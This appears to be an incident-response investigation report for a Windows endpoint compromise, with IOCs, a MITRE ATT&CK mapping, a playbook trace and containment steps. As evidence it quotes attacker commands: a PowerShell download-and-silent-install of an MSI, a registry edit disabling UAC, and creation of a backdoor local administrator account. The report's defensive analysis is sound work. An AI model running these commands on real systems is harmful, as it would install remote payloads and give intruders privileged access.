# INVESTIGATION SUMMARY: INC-52825 (Incident-001)

**Final Severity:** High
*High severity is justified because the incident shows likely post-compromise activity on an important Windows endpoint with privileged SYSTEM execution, a suspicious payload install, local administrator creation, UAC weakening, and command-and-control / lateral-movement indicators. The policy escalation factors apply for privilege misuse, repeated suspicious system modification, and likely compromise of an important asset. No evidence in the provided telemetry confirms ransomware, widespread outage, or sensitive data exfiltration, so Critical is not warranted.*

**Confidence Level:** High
*Confidence is High because multiple independent sources align: endpoint process telemetry, command-line artifacts, host/user context, threat-intel enrichment, and the incident classification all support the same conclusion. The evidence is sufficient and largely consistent, with strong indicators of malicious execution and privilege abuse. Some specifics of the full process ancestry and downstream impact are not fully visible, but they do not materially weaken the core conclusion.*

## Investigative Workflow
- Reviewed the incident timeline and correlated the high-risk NetWitness endpoint alert for BETHANYCHUCHU.
- Identified the affected host as BETHANYCHUCHU running Windows under privileged NT AUTHORITY\SYSTEM context.
- Correlated suspicious process execution and command lines including PowerShell ExecutionPolicy Bypass, reg.exe EnableLUA modification, sc.exe service-control commands, and msiexec silent installation.
- Extracted and noted key IOCs: 4.145.79.81, Sandy.exe, vmtoolsd.exe hash 8f490791f7164633e2bc3bfe129c829986a45b918566c2fe1d63f3c77b0eb28c, and C:\Users\Public\adduser.msi.
- Assessed the incident as high confidence post-compromise activity with lateral movement and privilege abuse indicators.
- Prepared containment recommendations focused on host isolation, IOC blocking, account remediation, and hunting for related internal activity.

## Technical Chronology & MITRE ATT&CK TTP Mapping

2025-07-14T11:21:34+00:00: NetWitness generated High Risk Alerts for host BETHANYCHUCHU (Windows), initially classifying the event as compromised asset / Command and Control and also associating it with Lateral Movement. The alert centered on vmtoolsd.exe running as NT AUTHORITY\SYSTEM from a VMware Tools path context and making outbound HTTPS connections to the IOC 4.145.79.81; the same incident also showed overlapping suspicious binaries and system-modification telemetry. The process/command evidence on the host included cmd.exe /c "C:\Program Files\VMware\VMware Tools\suspend-vm-default.bat" and resume-vm-default.bat activity, PowerShell ExecutionPolicy Bypass usage, reg.exe ADD of HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA /d 0 /f, sc.exe start wuauserv and other service-control actions, and msiexec.exe /quiet /qn /i C:\Users\Public\adduser.msi after a PowerShell Invoke-WebRequest to download adduser.msi from http://192.168.10.205/adduser.msi. The telemetry also showed cmd.exe /c net user admin2 Iaminside! /ADD && net localgroup Administrators admin2 /ADD, indicating creation of a local administrator account. Observed IOCs included file hash 8f490791f7164633e2bc3bfe129c829986a45b918566c2fe1d63f3c77b0eb28c (vmtoolsd.exe), and IP 4.145.79.81 with threat-intel context. The incident sequence therefore reflects privileged execution on BETHANYCHUCHU, system configuration weakening, local admin creation, payload download/install, and suspicious external network communication consistent with post-compromise activity and likely lateral-movement support.

| Timeline Phase / Activity | Observed Evidence | MITRE Tactic | MITRE Technique Name | MITRE ID |
| --- | --- | --- | --- | --- |
| Initial suspicious endpoint execution and C2 activity | vmtoolsd.exe running as NT AUTHORITY\SYSTEM on host BETHANYCHUCHU, hash 8f490791f7164633e2bc3bfe129c829986a45b918566c2fe1d63f3c77b0eb28c, outbound HTTPS to 4.145.79.81 | Command and Control | Application Layer Protocol: Web Protocols | T1071.001 |
| Payload retrieval and script-based execution | powershell.exe -ExecutionPolicy Bypass -C "Invoke-WebRequest -Uri http://192.168.10.205/adduser.msi -OutFile C:\Users\Public\adduser.msi" | Command and Control | Ingress Tool Transfer | T1105 |
| Payload installation | powershell.exe -ExecutionPolicy Bypass -C "msiexec /quiet /qn /i C:\Users\Public\adduser.msi" and msiexec.exe /quiet /qn /i C:\Users\Public\adduser.msi | Execution | Windows Command Shell / System Binary Proxy Execution: Msiexec | T1218.007 |
| Privilege weakening / defense evasion | cmd.exe reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f | Defense Evasion | Modify Registry | T1112 |
| Service control and system configuration manipulation | sc.exe start wuauserv and related service-control commands on BETHANYCHUCHU | Persistence | System Services: Service Execution | T1569.002 |
| Local account creation and privilege escalation | cmd.exe /c net user admin2 Iaminside! /ADD && net localgroup Administrators admin2 /ADD | Privilege Escalation | Create Account: Local Account | T1136.001 |
| Possible lateral movement context | Alert classification explicitly marked Lateral Movement; internal host references included 192.168.10.205, 192.168.10.207, 192.168.10.204, 192.168.20.16, and 192.168.20.201 in the same incident context | Lateral Movement | Remote Services | T1021 |
| Suspicious Windows utility execution consistent with post-compromise automation | cmd.exe, powershell.exe, reg.exe, sc.exe, and msiexec.exe used in sequence on BETHANYCHUCHU | Execution | System Services: Service Execution / Command and Scripting Interpreter | T1569.002 |

## Playbook Execution Trace
| Step ID | Instruction | Status | Findings |
| --- | --- | --- | --- |
| `step_1` | Identify 1. username 2. IP address 3. Login Details 4. Computer name 5. Operating System | **MET** | Username observed as Bethany Chu / BETHANYCHUCHU\Bethany Chu; privileged context also observed as NT AUTHORITY\SYSTEM. Host IP telemetry includes 192.168.10.207 and source IPv6 fe80:0:0:0:9706:3f55:e752:75ca. Login details are not explicit, but telemetry shows PowerShell ExecutionPolicy Bypass, cmd.exe, sc.exe, msiexec.exe, reg.exe, and net user/group modification activity. Computer name: BETHANYCHUCHU. Operating system: Windows. |
| `step_2` | Was it horizontal or vertical | **MET** | Horizontal movement. The incident timeline explicitly includes a Lateral Movement classification, and the supporting deep-dive context describes internal RFC1918 host-to-host activity across the same network ranges rather than privilege elevation from a lower to a higher local account only. |
| `step_3` | Was any malicious process spawned on the victim's machine? | **MET** | Yes. Suspicious/malicious processes and commands were executed on BETHANYCHUCHU, including vmtoolsd.exe running as NT AUTHORITY\SYSTEM, PowerShell with ExecutionPolicy Bypass, cmd.exe, sc.exe, reg.exe, msiexec.exe, and the suspicious payload/use of Sandy.exe from the VMware Tools path context. The clearest malicious action observed is cmd.exe creating admin2 and adding it to Administrators, plus PowerShell downloading and silently installing C:\Users\Public\adduser.msi. |
| `step_4` | Analyze the process tree for signs of malicious activity, such as privilege escalation, lateral movement, or data exfiltration. | **MET** | The process tree indicates post-compromise system modification and privilege abuse: UAC disabled via reg.exe / EnableLUA=0, service-control activity via sc.exe, local administrator creation via net user/admin group addition, and payload installation via msiexec.exe /quiet /qn /i C:\Users\Public\adduser.msi. The alert also ties to known-bad network IOCs (4.145.79.81 and prior related C2-like traffic), but no confirmed data exfiltration is evidenced in the provided telemetry. |
| `step_5` | Based on the analysis, determine if further investigation is necessary and the containment steps | **MET** | Further investigation is necessary. Containment should include immediate host isolation for BETHANYCHUCHU, blocking 4.145.79.81 and other observed IOCs, disabling or resetting suspicious accounts such as admin2, reviewing and removing unauthorized services/tasks/registry changes, and hunting for similar activity on peer hosts involved in the same internal network cluster. |

## Recommended Containment Actions
- Immediately isolate host BETHANYCHUCHU from the network at the EDR/network-control layer while preserving the endpoint for forensic acquisition.
- Block outbound and inbound connections to 4.145.79.81 at perimeter, proxy, and DNS control points; add vmtoolsd.exe-related hash 8f490791f7164633e2bc3bfe129c829986a45b918566c2fe1d63f3c77b0eb28c and Sandy.exe hash/filename indicators to EDR detections and quarantine rules.
- Disable the locally created account admin2, reset any credentials that may have been exposed on BETHANYCHUCHU, and review local Administrators group membership for unauthorized additions.
- Collect a volatile triage package from BETHANYCHUCHU before reboot: full process tree, active network connections, loaded modules, scheduled tasks, services, startup items, recent PowerShell history, and current registry state for HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System.
- Remove any unauthorized persistence artifacts, specifically undo the EnableLUA registry change, delete suspicious services or scheduled tasks linked to the observed commands, and verify the integrity of VMware Tools-related scripts such as suspend-vm-default.bat and resume-vm-default.bat.
- Hunt across the environment for the exact filenames, hash 8f490791f7164633e2bc3bfe129c829986a45b918566c2fe1d63f3c77b0eb28c, IP 4.145.79.81, and the command strings 'net user admin2 Iaminside!' and 'adduser.msi' on all Windows endpoints.
- Correlate authentication logs for internal hosts referenced in the timeline to identify any lateral movement attempts from or to 192.168.10.205, 192.168.10.207, 192.168.10.204, 192.168.20.16, and 192.168.20.201.
- Submit recovered binaries and the downloaded MSI to malware analysis, and validate whether vmtoolsd.exe, Sandy.exe, or adduser.msi are tampered or weaponized artifacts.

## Appendix M: Policy-Based Compliance Audit Log

| Audit ID | Decision Point | Policy Reference | Input Summary | Result | Decision Made | Human Review? | Timestamp |
| --- | --- | --- | --- | --- | --- | --- | --- |
| `AUD-DP07-1785109616-1` | **DP-07** | Appendix C | Critical System: False, Sensitive Data: False | *Pass* | `Investigate` | Yes | 2026-07-26T23:46:56Z |
| `AUD-DP08-1785109616-2` | **DP-08** | Appendix A | Severity classification: High | *Warning* | `Escalate` | Yes | 2026-07-26T23:46:56Z |
| `AUD-DP09-1785109616-3` | **DP-09** | Appendix F | Confidence level: High | *Pass* | `Investigate` | Yes | 2026-07-26T23:46:56Z |
| `AUD-DP10-1785109616-4` | **DP-10/DP-11** | Appendix G | Severity: High, Confidence: High, Ransomware: False, Guest OS: False | *Fail* | `Escalate` | Yes | 2026-07-26T23:46:56Z |
